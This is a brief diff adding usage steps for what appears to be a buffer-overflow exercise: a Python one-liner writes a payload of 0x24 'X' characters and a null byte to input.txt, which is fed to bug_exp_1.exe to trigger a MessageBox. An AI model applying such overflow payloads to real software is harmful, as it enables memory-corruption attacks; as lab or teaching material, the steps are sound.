@@ -1,0 +1,3 @@
+step1: create input.txt file ( touch input.txt )
+step2: create payload ( python -c "print 'X'*0x24+'\x00'" > input.txt )
+step3: run binary and get a MessageBox ( ./bug_exp_1.exe )
